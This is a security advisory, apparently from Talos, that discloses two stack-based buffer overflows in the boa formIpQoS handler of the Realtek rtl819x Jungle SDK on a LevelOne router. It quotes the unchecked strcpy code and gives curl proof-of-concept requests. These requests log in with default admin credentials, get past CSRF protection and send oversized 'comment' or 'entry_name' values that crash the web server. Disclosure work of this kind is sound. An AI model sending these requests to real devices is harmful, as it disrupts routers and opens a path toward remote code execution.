# Talos Vulnerability Report

### TALOS-2023-1895

## Realtek rtl819x Jungle SDK boa formIpQoS stack-based buffer overflow vulnerabilities

##### July 8, 2024

##### CVE Number

CVE-2023-50243,CVE-2023-50244

##### SUMMARY

Two stack-based buffer overflow vulnerabilities exist in the boa formIpQoS functionality of Realtek rtl819x Jungle SDK v3.4.11. A specially crafted series of HTTP requests can lead to remote code execution. An attacker can send a series of HTTP requests to trigger these vulnerabilities.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

LevelOne WBR-6013 RER4\_A\_v3411b\_2T2R\_LEV\_09\_170623

Realtek rtl819x Jungle SDK v3.4.11

##### PRODUCT URLS

rtl819x Jungle SDK - <https://www.realtek.com/en/>
WBR-6013 - <https://www.level1.com/level1_en/wbr-6013-n300-wireless-router-54069103>

##### CVSSv3 SCORE

7.2 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-121 - Stack-based Buffer Overflow

##### DETAILS

The rtl819x Jungle SDK is an SDK for routers. This SDK uses as web server boa.

These Realtek rtl819x Jungle SDK vulnerabilities were found while researching the Levelone WBR-6013 router. We are going to explain these vulnerabilities from the perspective of the WBR-6013 router.

The WBR-6013 router has a web server called `boa`. The version used in the device is that of a Realtek SDK that uses `boa`. One of the SDK’s API is `/boafrm/formRadvd`. This API allows modifications of quality of service settings. The function responsible for this API is `boa`’s `formIpQoS`:

```
void formIpQoS(request *wp, char *path, char *query)
{
    [...]
    IPQOS_T entry, entry_tmp;
    [...]

    strAdd = req_get_cstream_var(wp, ("addQos"), "");
    [...]
    if (strAdd[0]) {
        strVal = req_get_cstream_var(wp, ("enabled"), "");
        if ( !strcmp(strVal, "ON")){
            intVal = 1;
        }
        [...]
        strBandwidth = req_get_cstream_var(wp, ("bandwidth"), "");
        [...]
[1]     strComment = req_get_cstream_var(wp, ("comment"), "");
        [...]
        if(no_rule_flag==0)
        {
            if ( strComment[0] ) {
[2]             strcpy((char *)entry.entry_name, strComment);
            }
            [...]
[3]          strName = req_get_cstream_var(wp, ("entry_name"), "");
            if(strName[0])
            {
                apmib_get(MIB_QOS_RULE_TBL_NUM, (void *)&entryNum);

                for(j=1;j<=entryNum;j++)
                {
                    *((char *)&entry_tmp) = (char)j;
                    if ( apmib_get(MIB_QOS_RULE_TBL, (void *)&entry_tmp))
                    {
                        if((strlen(strName) == strlen(entry_tmp.entry_name)) && (memcmp(strName,entry_tmp.entry_name,strlen(strName))==0))
                        {
                            strcpy(tmpBuf, (" entry name conflict!"));
                            goto setErr;
                        }
                    }
                }
[4]              strcpy(entry.entry_name,strName);
            }
        }
        [...]
    }

    [...]
}

```

The function will fetch the `addQos` and `enabled` request’s parameters. These parameters have to be set and `enabled`. Specifically, they have to have the `On` value to reach the portions of code we are going to focus on. Furthermore, the `bandwidth` request’s parameter has to be set to a value different than zero. If the previous requirements are met, eventually, the code at `[1]` is reached.

At `[1]` the `comment` request’s parameter is fetched and copied at `[2]` into the `entry_name` struct member of the `entry` stack variable.

Eventually the code at `[3]` is also reached and the `entry_name` request’s parameters is fetched. This value is copied at `[4]`, if different than any other entry names already registered, into the `entry_name` struct member of the `entry` stack variable.

Both copies lead to an issue that we describe separately below.

#### CVE-2023-50243 - comment

Because no checks are performed on the size of the `comment` request’s parameter string, a buffer overflow can occur at `[2]` in the stack variable `entry`. An attacker could exploit this vulnerability to achieve arbitrary code execution.

#### Exploit Proof of Concept

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/ip6_qos.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formIpQoS` API:

```
curl -d "addQos=1&enabled=ON&bandwidth=1&comment=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formIpQoS

```

After the request the `boa` process will crash. The POC uses the default admin credentials.

#### CVE-2023-50244 - entry\_name

Because no checks are performed on the size of the `entry_name` request’s parameter string, a buffer overflow can occur at `[4]` in the stack variable `entry`. An attacker could exploit this vulnerability to achieve arbitrary code execution.

#### Exploit Proof of Concept

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/ip6_qos.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formIpQoS` API:

```
curl -d "addQos=1&enabled=ON&bandwidth=1&entry_name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formIpQoS

```

After the request the `boa` process will crash. The POC uses the default admin credentials.
